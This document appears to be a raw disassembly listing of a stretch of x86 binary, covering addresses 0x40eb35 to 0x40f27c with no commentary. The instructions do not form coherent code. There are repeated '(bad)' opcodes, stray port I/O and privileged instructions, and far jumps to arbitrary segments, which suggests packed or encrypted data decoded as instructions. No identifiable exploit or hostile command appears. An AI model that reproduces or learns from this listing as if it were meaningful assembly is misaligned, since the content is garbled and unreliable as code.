  40eb35:	and    eax,DWORD PTR [eax]
  40eb37:	nop
  40eb38:	rcr    DWORD PTR [ecx],0xe7
  40eb3b:	jae    0x40eb43
  40eb3d:	iret   
  40eb3e:	and    cl,bl
  40eb40:	(bad)  
  40eb41:	shr    BYTE PTR [ebp+0x6931f6a2],1
  40eb47:	or     esi,0x62
  40eb4a:	pusha  
  40eb4b:	mov    al,0xc5
  40eb4d:	push   ds
  40eb4e:	adc    al,0x6
  40eb50:	cs or  al,0xd0
  40eb53:	lock mov al,0xec
  40eb56:	jle    0x40eb44
  40eb58:	inc    ebp
  40eb59:	test   al,0x76
  40eb5b:	cmp    bh,BYTE PTR [edi+0x6c]
  40eb5e:	mov    ch,0xad
  40eb60:	daa    
  40eb61:	add    edi,DWORD PTR [esi-0x2ca48787]
  40eb67:	sar    DWORD PTR [edx],1
  40eb69:	adc    ch,0xd1
  40eb6c:	push   esp
  40eb6d:	xchg   esi,eax
  40eb6e:	dec    esp
  40eb6f:	xor    al,0xd8
  40eb71:	popa   
  40eb72:	sahf   
  40eb73:	scas   eax,DWORD PTR es:[edi]
  40eb74:	cmp    eax,0xbf97bba2
  40eb79:	adc    DWORD PTR [ecx+0x1942892],esp
  40eb7f:	pop    ebx
  40eb80:	xor    edi,edi
  40eb82:	ins    BYTE PTR es:[edi],dx
  40eb83:	pop    ss
  40eb84:	mov    esp,0x58f51e15
  40eb89:	dec    esp
  40eb8a:	cmp    edi,DWORD PTR [ecx+0x55]
  40eb8d:	sub    eax,0x3cd76ef5
  40eb92:	xchg   edi,eax
  40eb93:	in     al,0x56
  40eb95:	sub    eax,0xf20ae729
  40eb9a:	xor    DWORD PTR [edi],ecx
  40eb9c:	(bad)  
  40eb9d:	in     al,0xbb
  40eb9f:	lea    ebp,[eax-0x5f]
  40eba2:	aas    
  40eba3:	add    ah,BYTE PTR [esi]
  40eba5:	imul   ebp,eax,0x53102004
  40ebab:	mov    ebx,0xf8c7e416
  40ebb0:	inc    ebx
  40ebb1:	adc    BYTE PTR [ecx+0x26],dl
  40ebb4:	xor    esp,0x49
  40ebb7:	or     BYTE PTR [edi],0xf2
  40ebba:	fcomp  DWORD PTR [ecx]
  40ebbc:	sub    edi,eax
  40ebbe:	ins    DWORD PTR es:[edi],dx
  40ebbf:	sbb    eax,0x794bd093
  40ebc4:	mov    DWORD PTR cs:[edx-0x7e],eax
  40ebc8:	pushf  
  40ebc9:	xchg   ebx,eax
  40ebca:	or     BYTE PTR [ebp-0x1ae87d0e],cl
  40ebd0:	fs dec edi
  40ebd2:	or     al,0xe9
  40ebd4:	inc    ebp
  40ebd5:	sbb    eax,0x41d04e97
  40ebda:	lods   al,BYTE PTR ds:[esi]
  40ebdb:	pop    eax
  40ebdc:	lahf   
  40ebdd:	jecxz  0x40ec4b
  40ebdf:	mov    bl,0x9
  40ebe1:	dec    ebx
  40ebe2:	xchg   edi,eax
  40ebe3:	lar    ebp,di
  40ebe6:	test   BYTE PTR [ecx],0x7e
  40ebe9:	dec    ebx
  40ebea:	ja     0x40ebfc
  40ebec:	popf   
  40ebed:	xor    esi,ebx
  40ebef:	dec    esp
  40ebf0:	xor    edi,edi
  40ebf2:	call   0x9c92:0x4d9c6d5c
  40ebf9:	int3   
  40ebfa:	ss pop ds
  40ebfc:	mov    edx,0xa57dce68
  40ec01:	xor    ebx,DWORD PTR [ecx+0x2f8ffaad]
  40ec07:	or     esp,DWORD PTR [eax-0x5a]
  40ec0a:	(bad)  
  40ec0b:	aas    
  40ec0c:	sub    bl,BYTE PTR [ebp-0x2a]
  40ec0f:	fiadd  DWORD PTR [esi-0x57]
  40ec12:	and    edx,DWORD PTR [ebx-0x50124d8c]
  40ec18:	and    al,0xbe
  40ec1a:	inc    edi
  40ec1b:	enter  0x637b,0xc4
  40ec1f:	popf   
  40ec20:	push   esp
  40ec21:	push   ecx
  40ec22:	add    al,0x23
  40ec24:	aaa    
  40ec25:	lds    esi,FWORD PTR [ebp-0x76e8551e]
  40ec2b:	popa   
  40ec2c:	or     al,0x80
  40ec2e:	out    0x2f,eax
  40ec30:	or     al,0xdb
  40ec32:	jge    0x40ec05
  40ec34:	(bad)  
  40ec35:	pop    esi
  40ec36:	test   al,0x3e
  40ec38:	pop    edi
  40ec39:	or     BYTE PTR [ebx-0x13e9f007],cl
  40ec3f:	loop   0x40ec77
  40ec41:	mov    al,ds:0x2fbb0780
  40ec46:	fisubr WORD PTR [esi]
  40ec48:	inc    edx
  40ec49:	ret    0x5f1e
  40ec4c:	xchg   esi,eax
  40ec4d:	repz mov ah,0xf5
  40ec50:	loope  0x40eca0
  40ec52:	enter  0x50e7,0xa3
  40ec56:	outs   dx,DWORD PTR ds:[esi]
  40ec57:	movd   mm7,ebx
  40ec5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec5b:	pop    edx
  40ec5c:	cmp    DWORD PTR [ecx],eax
  40ec5e:	inc    eax
  40ec5f:	inc    esp
  40ec60:	mov    esp,0xb7b9b81b
  40ec65:	mov    cl,0x2c
  40ec67:	or     ah,cl
  40ec69:	sbb    BYTE PTR [edi+0x553ff174],bl
  40ec6f:	xchg   ecx,eax
  40ec70:	mov    edi,0x3c3d9f85
  40ec75:	ss pop eax
  40ec77:	push   ss
  40ec78:	data16 jae 0x40ec21
  40ec7b:	mov    ch,0x26
  40ec7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec7e:	inc    edi
  40ec7f:	sub    BYTE PTR [edx-0x9],cl
  40ec82:	or     ebx,DWORD PTR [edx+ecx*2+0x2a]
  40ec86:	jb     0x40ec73
  40ec88:	lahf   
  40ec89:	std    
  40ec8a:	call   0xb464:0x1329c4c3
  40ec91:	aad    0x19
  40ec93:	pusha  
  40ec94:	adc    BYTE PTR [edx+ebx*8-0x1750535a],bh
  40ec9b:	ins    BYTE PTR es:[edi],dx
  40ec9c:	xchg   esp,eax
  40ec9d:	cwde   
  40ec9e:	data16 or al,0x78
  40eca1:	std    
  40eca2:	xor    edx,DWORD PTR [ecx]
  40eca4:	ret    0xae30
  40eca7:	push   ebx
  40eca8:	and    al,0xc2
  40ecaa:	or     eax,0x23296d91
  40ecaf:	cvttps2pi mm0,QWORD PTR [ecx+0x37]
  40ecb3:	leave  
  40ecb4:	push   es
  40ecb5:	inc    eax
  40ecb6:	aad    0x6f
  40ecb8:	and    eax,DWORD PTR [edi]
  40ecba:	bound  esp,QWORD PTR [ebx+0x28b630ba]
  40ecc0:	xchg   edx,eax
  40ecc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecc2:	push   ss
  40ecc3:	push   0x77
  40ecc5:	in     eax,dx
  40ecc6:	mov    ebp,0xfa9c0d01
  40eccb:	pusha  
  40eccc:	mov    esi,0x47bf2b41
  40ecd1:	inc    esi
  40ecd2:	mov    ss,WORD PTR [edi+0x38]
  40ecd5:	mov    BYTE PTR [eax],bh
  40ecd7:	push   esi
  40ecd8:	sbb    BYTE PTR [ebp+0x61dff839],0xab
  40ecdf:	(bad)  
  40ece0:	repnz sbb al,0x2b
  40ece3:	daa    
  40ece4:	ficom  WORD PTR [ecx-0x8ae9c01]
  40ecea:	sub    dl,BYTE PTR [edx+0x5d4caefa]
  40ecf0:	xor    edi,DWORD PTR [esi-0x2c]
  40ecf3:	pop    ebx
  40ecf4:	pop    ebp
  40ecf5:	les    esp,FWORD PTR [ebx+0x57]
  40ecf8:	punpcklbw mm2,DWORD PTR [edx+0x22]
  40ecfc:	push   0xffffffd8
  40ecfe:	dec    esi
  40ecff:	xlat   BYTE PTR ds:[ebx]
  40ed00:	test   DWORD PTR [edi-0xe],ecx
  40ed03:	adc    bl,BYTE PTR [eax-0x5e]
  40ed06:	sub    eax,DWORD PTR [edi+eax*2]
  40ed09:	inc    esp
  40ed0a:	fcmove st,st(4)
  40ed0c:	sub    DWORD PTR [ebx+0x18],eax
  40ed0f:	repnz lahf 
  40ed11:	out    0x29,eax
  40ed13:	sahf   
  40ed14:	clc    
  40ed15:	sub    bl,BYTE PTR [esi]
  40ed17:	in     eax,0x11
  40ed19:	fdiv   QWORD PTR [ebp+0x63]
  40ed1c:	lds    eax,FWORD PTR [eax]
  40ed1e:	(bad)  
  40ed1f:	jmp    0xbe89:0xab40da8e
  40ed26:	je     0x40eceb
  40ed28:	mov    esi,0x196e0450
  40ed2d:	xchg   esi,eax
  40ed2e:	cmp    ebp,DWORD PTR [eax]
  40ed30:	inc    edx
  40ed31:	mov    esi,0x4c614e2e
  40ed36:	ror    DWORD PTR [edx],0x7a
  40ed39:	push   es
  40ed3a:	out    dx,eax
  40ed3b:	gs xor eax,0xbba4c1bd
  40ed41:	jle    0x40ed8a
  40ed43:	stc    
  40ed44:	adc    eax,0x78a13cf4
  40ed49:	sti    
  40ed4a:	cs cmp edx,esi
  40ed4d:	aaa    
  40ed4e:	out    0x6,al
  40ed50:	fistp  DWORD PTR [esi+0xc]
  40ed53:	xchg   esi,eax
  40ed54:	sahf   
  40ed55:	jmp    0x6926:0x3e6584b
  40ed5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed5d:	and    DWORD PTR [eax],0xb
  40ed60:	(bad)  
  40ed61:	cmp    eax,0x20159203
  40ed66:	popf   
  40ed67:	xchg   ecx,ebx
  40ed69:	pop    esp
  40ed6a:	pop    ss
  40ed6b:	nop
  40ed6c:	cli    
  40ed6d:	out    0x91,eax
  40ed6f:	and    al,0x80
  40ed71:	call   0xc127:0x260be487
  40ed78:	mov    bh,0x56
  40ed7a:	inc    ebx
  40ed7b:	xlat   BYTE PTR ds:[ebx]
  40ed7c:	int    0xdc
  40ed7e:	xchg   edx,eax
  40ed7f:	stos   BYTE PTR es:[edi],al
  40ed80:	jmp    0x9f09:0x97be969f
  40ed87:	pop    es
  40ed88:	jecxz  0x40ed84
  40ed8a:	or     esp,0x10
  40ed8d:	(bad)  
  40ed8e:	popf   
  40ed8f:	push   edx
  40ed90:	sbb    DWORD PTR [ebp-0x3b7c78e8],0xffffff9f
  40ed97:	inc    esp
  40ed98:	or     ebp,DWORD PTR [esi+0x541ecac4]
  40ed9e:	loop   0x40ee14
  40eda0:	pop    edi
  40eda1:	sub    BYTE PTR [esi+0x25],cl
  40eda4:	aas    
  40eda5:	cmp    al,BYTE PTR ds:0x8ebea0ea
  40edab:	mov    eax,ds:0x509cbe3e
  40edb0:	mov    dh,0x35
  40edb2:	pop    eax
  40edb3:	call   DWORD PTR [ebp+0x5b]
  40edb6:	cs inc edi
  40edb8:	adc    BYTE PTR [ebp+0x177abd26],0x48
  40edbf:	sub    DWORD PTR [esi+0x11677ea0],eax
  40edc5:	sub    ecx,esi
  40edc7:	dec    edx
  40edc8:	and    eax,0xcd3b4805
  40edcd:	shr    BYTE PTR [eax],cl
  40edcf:	ret    0x16e3
  40edd2:	mov    ch,0x42
  40edd4:	jno    0x40edf3
  40edd6:	(bad)  
  40edd7:	into   
  40edd8:	retf   0x1b03
  40eddb:	shl    BYTE PTR [edx-0x6e],0xa2
  40eddf:	pop    esp
  40ede0:	vpunpckhdq xmm6,xmm4,xmm3
  40ede4:	xchg   edi,eax
  40ede5:	xor    al,0xae
  40ede7:	push   es
  40ede8:	imul   ebp,ecx,0x8636d390
  40edee:	push   0x4
  40edf0:	arpl   WORD PTR [ecx-0x3f6d7085],bp
  40edf6:	int3   
  40edf7:	pop    ss
  40edf8:	leave  
  40edf9:	(bad)  
  40edfa:	sti    
  40edfb:	in     eax,dx
  40edfc:	ss loope 0x40edef
  40edff:	inc    edi
  40ee00:	sub    cl,cl
  40ee02:	mov    DWORD PTR [edx-0x3d],eax
  40ee05:	clc    
  40ee06:	(bad)  
  40ee07:	jmp    0x316019e
  40ee0c:	dec    esi
  40ee0d:	fst    DWORD PTR [ecx+0x3784be58]
  40ee13:	add    dh,BYTE PTR [esi-0x7428aa46]
  40ee19:	vmread DWORD PTR [ecx-0x62d99377],ecx
  40ee20:	call   0x265b0a51
  40ee25:	je     0x40ee8a
  40ee27:	aad    0xaf
  40ee29:	or     DWORD PTR [edi],edx
  40ee2b:	bound  esi,QWORD PTR [ebx-0x45]
  40ee2e:	aam    0x2d
  40ee30:	jle    0x40ee5e
  40ee32:	sbb    BYTE PTR [ebx],ch
  40ee34:	mov    BYTE PTR [ebx+0x58],bl
  40ee37:	sti    
  40ee38:	jle    0x40ede3
  40ee3a:	inc    ecx
  40ee3b:	in     al,0xab
  40ee3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee3e:	ins    BYTE PTR es:[edi],dx
  40ee3f:	ins    DWORD PTR es:[edi],dx
  40ee40:	(bad)  
  40ee41:	aam    0x2d
  40ee43:	(bad)  
  40ee44:	sub    esp,DWORD PTR [edx]
  40ee46:	sbb    al,0xde
  40ee48:	lods   al,BYTE PTR ds:[esi]
  40ee49:	lds    esp,FWORD PTR [eax-0x40f8f6f]
  40ee4f:	jle    0x40eec4
  40ee51:	in     al,dx
  40ee52:	sbb    BYTE PTR [esi+ebp*1+0x3d],0x5c
  40ee57:	ins    BYTE PTR es:[edi],dx
  40ee58:	adc    dh,BYTE PTR [ebx-0x6ee2eb8]
  40ee5e:	int    0xc7
  40ee60:	popf   
  40ee61:	std    
  40ee62:	mov    al,ds:0xf75ae135
  40ee67:	ret    0xb4d4
  40ee6a:	mov    ebx,0x99c0e2dd
  40ee6f:	scas   al,BYTE PTR es:[edi]
  40ee70:	adc    edi,edx
  40ee72:	pxor   mm2,QWORD PTR ds:0xa8a1b099
  40ee79:	mov    ebp,0x9e287687
  40ee7e:	fnstsw WORD PTR gs:[ecx+eax*8+0x79]
  40ee83:	mov    esp,0x50989555
  40ee88:	adc    al,0x90
  40ee8a:	data16 or al,0x71
  40ee8d:	pop    esi
  40ee8e:	int    0xa6
  40ee90:	in     eax,dx
  40ee91:	repz call 0xff02d855
  40ee97:	outs   dx,DWORD PTR ds:[esi]
  40ee98:	imul   al
  40ee9a:	mov    ecx,0xf4fb4db7
  40ee9f:	rol    esp,cl
  40eea1:	(bad)  
  40eea3:	or     BYTE PTR [esp+eax*4],ch
  40eea6:	or     BYTE PTR [ebp-0x35],bh
  40eea9:	scas   al,BYTE PTR es:[edi]
  40eeaa:	ins    DWORD PTR es:[edi],dx
  40eeab:	test   DWORD PTR [eax],eax
  40eead:	mov    ecx,DWORD PTR [edi]
  40eeaf:	push   ebx
  40eeb0:	sub    DWORD PTR [edx+ecx*4-0x5e83a068],0xa6cd3b65
  40eebb:	mov    ch,0xeb
  40eebd:	mov    ch,cl
  40eebf:	out    0x54,al
  40eec1:	xor    ah,BYTE PTR [ecx+edi*2]
  40eec4:	sbb    al,0x77
  40eec6:	jl     0x40ef17
  40eec8:	pop    esi
  40eec9:	pop    edi
  40eeca:	xchg   esp,eax
  40eecb:	imul   ecx,DWORD PTR [esp+edx*1+0x53],0xffffffe0
  40eed0:	inc    ebx
  40eed1:	mov    dh,0xb8
  40eed3:	clc    
  40eed4:	mov    dh,BYTE PTR [esi+esi*2+0x67]
  40eed8:	push   edx
  40eed9:	out    0xf,al
  40eedb:	hlt    
  40eedc:	out    dx,al
  40eedd:	in     eax,dx
  40eede:	or     BYTE PTR [edi+ecx*2],dh
  40eee1:	inc    ebx
  40eee2:	mov    DWORD PTR [edx+esi*1-0x71],edx
  40eee6:	xchg   edi,eax
  40eee7:	inc    ecx
  40eee8:	xchg   ebx,eax
  40eee9:	xor    dl,BYTE PTR [ecx-0x35]
  40eeec:	cmp    DWORD PTR [ebx+0x63fc2cf0],esp
  40eef2:	dec    edi
  40eef3:	jecxz  0x40ee78
  40eef5:	adc    eax,0x23d0c2a1
  40eefa:	out    dx,al
  40eefb:	repz sbb ecx,DWORD PTR [eax+ebp*1-0x5b]
  40ef00:	stc    
  40ef01:	ds sahf 
  40ef03:	inc    edi
  40ef04:	shl    BYTE PTR [edi+0x414bb779],0x38
  40ef0b:	mov    WORD PTR [edx-0x2b],gs
  40ef0e:	push   es
  40ef0f:	aam    0xe4
  40ef11:	mov    esi,DWORD PTR ds:0x25e50827
  40ef17:	mov    edx,0x8882bd8e
  40ef1c:	or     eax,0xca676f44
  40ef21:	mov    ds:0xacf531,eax
  40ef26:	mov    ebp,0x5565c23b
  40ef2b:	mov    ebp,0x7883a10b
  40ef30:	push   eax
  40ef31:	sbb    eax,0xed185f28
  40ef36:	popf   
  40ef37:	outs   dx,DWORD PTR ds:[esi]
  40ef38:	sub    bl,ch
  40ef3a:	pop    eax
  40ef3b:	push   ebp
  40ef3c:	xchg   esi,eax
  40ef3d:	mov    WORD PTR [edx-0xed11f16],?
  40ef43:	rcr    BYTE PTR [eax+0x6359879],1
  40ef49:	add    al,BYTE PTR [eax-0x7a]
  40ef4c:	inc    eax
  40ef4d:	push   edi
  40ef4e:	(bad)  
  40ef4f:	rcl    eax,1
  40ef51:	adc    al,0xd5
  40ef53:	and    ebx,DWORD PTR [eax]
  40ef55:	and    BYTE PTR [eax],dh
  40ef57:	jecxz  0x40eef1
  40ef59:	cwde   
  40ef5a:	sub    dh,BYTE PTR [esi]
  40ef5c:	(bad)  
  40ef5d:	xlat   BYTE PTR ds:[ebx]
  40ef5e:	ffreep st(0)
  40ef61:	cwde   
  40ef62:	mov    ebx,0xf38e6a95
  40ef67:	imul   ecx,esp,0xffffff87
  40ef6a:	fidiv  DWORD PTR [ebp-0x36]
  40ef6d:	retf   0xd6bf
  40ef70:	(bad)  [edx+0x37f5bcfa]
  40ef76:	shr    DWORD PTR [esi-0xfa03770],1
  40ef7c:	test   DWORD PTR [ebp+ecx*2-0x3ceb302e],ecx
  40ef83:	cdq    
  40ef84:	pop    edi
  40ef85:	mov    ss,WORD PTR [ebp+eiz*2+0x3feb8d57]
  40ef8c:	add    esp,DWORD PTR [edi]
  40ef8e:	mov    dh,0xee
  40ef90:	cmc    
  40ef91:	sub    BYTE PTR [ebx+0x60],dh
  40ef94:	add    al,0xd9
  40ef96:	mov    cl,0xb3
  40ef98:	pop    es
  40ef99:	aam    0x4d
  40ef9b:	xchg   ecx,eax
  40ef9c:	imul   DWORD PTR [esi-0x2074a968]
  40efa2:	adc    BYTE PTR [edi],0xae
  40efa5:	dec    esp
  40efa6:	stc    
  40efa7:	xlat   BYTE PTR ds:[ebx]
  40efa8:	xlat   BYTE PTR ds:[ebx]
  40efa9:	inc    ebp
  40efaa:	enter  0x8490,0x9f
  40efae:	pop    esp
  40efaf:	inc    ebp
  40efb0:	inc    ecx
  40efb1:	or     edi,DWORD PTR [ebx]
  40efb3:	sub    eax,0x3f3da7fe
  40efb8:	in     eax,dx
  40efb9:	fcomp  DWORD PTR [ecx+eiz*2]
  40efbc:	jb     0x40ef5f
  40efbe:	mul    DWORD PTR [edi]
  40efc0:	cdq    
  40efc1:	out    0x23,al
  40efc3:	div    DWORD PTR [edx-0xe4ba04e]
  40efc9:	(bad)  
  40efca:	fwait
  40efcb:	jmp    0xe108e59a
  40efd0:	push   0xfffffffd
  40efd2:	pushf  
  40efd3:	data16 sbb al,BYTE PTR [eax+0x13]
  40efd7:	sti    
  40efd8:	jno    0x40f00c
  40efda:	mov    bl,0x82
  40efdc:	(bad)
  40efdf:	inc    ebx
  40efe0:	adc    eax,0xbd559cb
  40efe5:	xchg   edx,eax
  40efe6:	cmp    dh,BYTE PTR [edi+eax*8+0x2c]
  40efea:	add    al,0x24
  40efec:	xor    al,0xd0
  40efee:	add    DWORD PTR [edx-0x1ce2ebab],0xffffffef
  40eff5:	jmp    0x40ef8e
  40eff7:	lea    edx,[ecx]
  40eff9:	jnp    0x40f057
  40effb:	jne    0x40efce
  40effd:	adc    dl,bl
  40efff:	xchg   dh,dh
  40f001:	push   es
  40f002:	add    eax,0x5beae153
  40f007:	data16 out dx,al
  40f009:	pop    esp
  40f00a:	es inc edi
  40f00c:	jno    0x40eff5
  40f00e:	rcr    BYTE PTR [eax+0x66c78bd7],1
  40f014:	(bad)  
  40f015:	loop   0x40f049
  40f017:	fmul   QWORD PTR [ecx+0x78]
  40f01a:	fcos   
  40f01c:	xlat   BYTE PTR ds:[ebx]
  40f01d:	mov    BYTE PTR ds:[esi+0x6c],bl
  40f021:	sbb    eax,DWORD PTR [edx-0x6f3d7214]
  40f027:	clc    
  40f028:	mov    cl,0x82
  40f02a:	jnp    0x40f038
  40f02c:	and    bh,BYTE PTR [eax+0x2a]
  40f02f:	lods   al,BYTE PTR ds:[esi]
  40f030:	push   edi
  40f031:	add    al,0xab
  40f033:	xlat   BYTE PTR ds:[ebx]
  40f034:	inc    ebp
  40f035:	push   ds
  40f036:	mov    ah,ch
  40f038:	aaa    
  40f039:	frstor [esi-0x2c]
  40f03c:	xchg   edi,eax
  40f03d:	xchg   esp,eax
  40f03e:	fnstsw WORD PTR [ecx-0x14]
  40f041:	arpl   WORD PTR [eax+0x2d7aa20b],ax
  40f047:	fild   DWORD PTR [edi+eax*8-0x1737f262]
  40f04e:	mov    ds:0xabb6cee,eax
  40f053:	jo     0x40f078
  40f055:	jg     0x40f028
  40f057:	dec    ebx
  40f058:	mov    esp,0x9ca23294
  40f05d:	std    
  40f05e:	xor    dh,al
  40f060:	sub    bl,BYTE PTR [ebp+0x47]
  40f063:	sub    ebx,ecx
  40f065:	inc    esp
  40f066:	jbe    0x40f0c9
  40f068:	and    al,0xa5
  40f06a:	lock xchg esp,eax
  40f06c:	mov    ds:0x6869a3aa,al
  40f071:	mov    al,ds:0x9a91f162
  40f076:	xchg   BYTE PTR [eax+0x4c],dl
  40f079:	dec    ecx
  40f07a:	rol    BYTE PTR ds:0xe726f454,1
  40f080:	xchg   esi,eax
  40f081:	pop    edi
  40f082:	dec    edx
  40f083:	adc    ecx,esi
  40f085:	loope  0x40f08c
  40f087:	adc    eax,ebp
  40f089:	int3   
  40f08a:	outs   dx,BYTE PTR ds:[esi]
  40f08b:	jns    0x40f0da
  40f08d:	mov    bx,0xa9e5
  40f091:	aas    
  40f092:	sahf   
  40f093:	mov    ds:0x1e38995a,eax
  40f098:	popa   
  40f099:	ret    0x785f
  40f09c:	or     DWORD PTR [edx],edi
  40f09e:	pop    ss
  40f09f:	push   es
  40f0a0:	fs inc eax
  40f0a2:	nop
  40f0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0a5:	pushf  
  40f0a6:	mov    edx,DWORD PTR [eax-0x25374c11]
  40f0ac:	(bad)  
  40f0ae:	js     0x40f11f
  40f0b0:	popf   
  40f0b1:	pop    ebp
  40f0b2:	mov    cl,0x56
  40f0b4:	nop    DWORD PTR [edi-0x3c8919a6]
  40f0bb:	pop    ds
  40f0bc:	(bad)  
  40f0bd:	cmp    eax,ebx
  40f0bf:	mov    al,ds:0xce351067
  40f0c4:	cmp    al,0xe4
  40f0c6:	jne    0x40f064
  40f0c8:	shl    ah,1
  40f0ca:	mov    ah,0x99
  40f0cc:	or     al,BYTE PTR [esi]
  40f0ce:	sbb    eax,0xd59833c9
  40f0d3:	jmp    0x89ccc930
  40f0d8:	cmc    
  40f0d9:	push   cs
  40f0da:	fnstsw WORD PTR [esi]
  40f0dc:	push   ss
  40f0dd:	mov    WORD PTR [eax-0x37],ss
  40f0e0:	xor    dl,BYTE PTR [ebx]
  40f0e2:	sbb    cl,BYTE PTR ds:0xdf0a4bcf
  40f0e8:	and    DWORD PTR [eax],ebx
  40f0ea:	mov    al,BYTE PTR [edi+0x2e]
  40f0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0ee:	mov    ebp,0x1d3faaf2
  40f0f3:	xlat   BYTE PTR ds:[ebx]
  40f0f4:	add    DWORD PTR [ecx+0x12a6d244],ebx
  40f0fa:	mov    eax,0xd7639d99
  40f0ff:	int    0xdd
  40f101:	imul   ecx,DWORD PTR [esi],0x45e260a9
  40f107:	xchg   ebp,eax
  40f108:	xchg   BYTE PTR [ecx],dh
  40f10a:	leave  
  40f10b:	add    ch,0x95
  40f10e:	cwde   
  40f10f:	mov    edi,DWORD PTR [ebx+0x69]
  40f112:	adc    BYTE PTR es:[ebx+eiz*4],ah
  40f116:	repnz lahf 
  40f118:	push   eax
  40f119:	jnp    0x40f176
  40f11b:	jns    0x40f122
  40f11d:	mov    bh,0xb9
  40f11f:	xchg   BYTE PTR [ebx-0x3b],ch
  40f122:	dec    ebp
  40f123:	xor    al,al
  40f125:	dec    ebx
  40f126:	jge    0x40f14a
  40f128:	jne    0x40f168
  40f12a:	into   
  40f12b:	mov    gs:0xd2de103,al
  40f131:	adc    esp,DWORD PTR [eax+edi*2+0x59]
  40f135:	mov    BYTE PTR [ecx+0x5],dl
  40f138:	mov    ebx,0x9e680bae
  40f13d:	adc    ebp,DWORD PTR [esi-0x38]
  40f140:	daa    
  40f141:	xchg   edi,eax
  40f142:	dec    edi
  40f143:	push   es
  40f144:	lahf   
  40f145:	stos   DWORD PTR es:[edi],eax
  40f146:	inc    ebp
  40f147:	push   edx
  40f148:	sbb    DWORD PTR [ecx+ebp*1+0x1c849b11],0x37
  40f150:	and    ebx,esi
  40f152:	test   ecx,esi
  40f154:	pop    eax
  40f155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f156:	push   esi
  40f157:	push   es
  40f158:	push   es
  40f159:	pop    ebx
  40f15a:	shl    DWORD PTR [edx+0x729dfbe4],cl
  40f160:	mov    ebp,0xe283d586
  40f165:	retf   0x7870
  40f168:	repnz mov dh,BYTE PTR [eiz*1-0x4cf6bf74]
  40f170:	and    BYTE PTR [esi+0xd],dl
  40f173:	call   0xa9cb8fa8
  40f178:	xchg   esp,eax
  40f179:	and    edi,DWORD PTR [edx-0x59]
  40f17c:	idiv   DWORD PTR [ebp-0x53533833]
  40f182:	aas    
  40f183:	ss pop ebp
  40f185:	xchg   eax,ebx
  40f187:	jmp    0x34cf:0xfce0bf14
  40f18e:	test   dh,ch
  40f190:	aaa    
  40f191:	fwait
  40f192:	aad    0xc1
  40f194:	sub    eax,0x8f35cc3f
  40f199:	ins    BYTE PTR es:[edi],dx
  40f19a:	inc    ebx
  40f19b:	pop    es
  40f19c:	inc    BYTE PTR [esi-0x43]
  40f19f:	pop    esp
  40f1a0:	retf   0xf5fb
  40f1a3:	shr    BYTE PTR [ebp+0x52],1
  40f1a6:	cmp    eax,0xd13daee8
  40f1ab:	hlt    
  40f1ac:	(bad)  
  40f1ad:	jb     0x40f209
  40f1af:	and    eax,0xa2828eb5
  40f1b4:	sub    eax,edx
  40f1b6:	shl    BYTE PTR [edi-0x6],cl
  40f1b9:	pmaddwd mm3,QWORD PTR [ebx-0x22db96de]
  40f1c0:	pop    ebx
  40f1c1:	or     al,0xf1
  40f1c3:	shr    DWORD PTR [ebx+0x3ef2ed2b],0xe
  40f1ca:	mov    ds:0x3b3be932,eax
  40f1cf:	adc    al,BYTE PTR [ebx+0xd]
  40f1d2:	sub    al,bl
  40f1d4:	inc    esp
  40f1d5:	mov    DWORD PTR [esi],esp
  40f1d7:	pop    ecx
  40f1d8:	dec    esi
  40f1d9:	mov    bl,0xc3
  40f1db:	push   edi
  40f1dc:	call   0xa1c31f34
  40f1e1:	repnz retf 0xf2b4
  40f1e5:	jmp    FWORD PTR [ebx]
  40f1e7:	leave  
  40f1e8:	xchg   edi,eax
  40f1e9:	(bad)  
  40f1ea:	cmp    eax,0x460d00bf
  40f1ef:	cmp    DWORD PTR [esi],0x7d
  40f1f2:	les    ecx,FWORD PTR [ecx+0x40]
  40f1f5:	jns    0x40f1c6
  40f1f7:	cmp    DWORD PTR [edi-0x1de8b0d0],ebp
  40f1fd:	dec    eax
  40f1fe:	cmc    
  40f1ff:	imul   esi,DWORD PTR [ebp+0x48ccbcb0],0x495c7148
  40f209:	adc    al,0x8f
  40f20b:	ds mov dh,0x6
  40f20e:	aas    
  40f20f:	repnz dec edx
  40f211:	fild   QWORD PTR [ebx+edi*2-0x31]
  40f215:	xchg   ecx,eax
  40f216:	inc    ebx
  40f217:	je     0x40f290
  40f219:	cmp    eax,0xb4c6b9a6
  40f21e:	in     al,dx
  40f21f:	jmp    0x40f286
  40f221:	div    DWORD PTR [edi+0xc]
  40f224:	retf   0x9563
  40f227:	push   esp
  40f228:	push   eax
  40f229:	ds inc ebp
  40f22b:	rcl    BYTE PTR [eax],cl
  40f22d:	rcr    dl,cl
  40f22f:	mov    ah,BYTE PTR [edx+0x637434b7]
  40f235:	retf   
  40f236:	daa    
  40f237:	fsubp  st(0),st
  40f239:	jmp    0x3d4:0x51695792
  40f240:	div    BYTE PTR [esi]
  40f242:	push   ebp
  40f243:	out    dx,al
  40f244:	ss (bad) 
  40f246:	push   0x8755a662
  40f24b:	ins    BYTE PTR es:[edi],dx
  40f24c:	stos   DWORD PTR es:[edi],eax
  40f24d:	nop
  40f24e:	sub    ebp,eax
  40f250:	or     al,0xb5
  40f252:	cmp    ah,BYTE PTR [ebx]
  40f254:	loopne 0x40f298
  40f256:	sbb    BYTE PTR [ebx+0x18],ch
  40f259:	out    0xd9,eax
  40f25b:	or     DWORD PTR [ebp+0x40],edi
  40f25e:	xchg   ebp,eax
  40f25f:	jns    0x40f2af
  40f261:	jmp    0xbad5:0xd0128cd7
  40f268:	add    ch,BYTE PTR [edx]
  40f26a:	inc    esi
  40f26b:	dec    esp
  40f26c:	outs   dx,DWORD PTR ds:[esi]
  40f26d:	jo     0x40f2a3
  40f26f:	out    dx,al
  40f270:	sub    al,0xc4
  40f272:	dec    ecx
  40f273:	pusha  
  40f274:	dec    edi
  40f275:	cwde   
  40f276:	mov    DWORD PTR [eax+0x2a],esi
  40f279:	ret    0x1152
  40f27c:	and    eax,0xcfcb6cdb
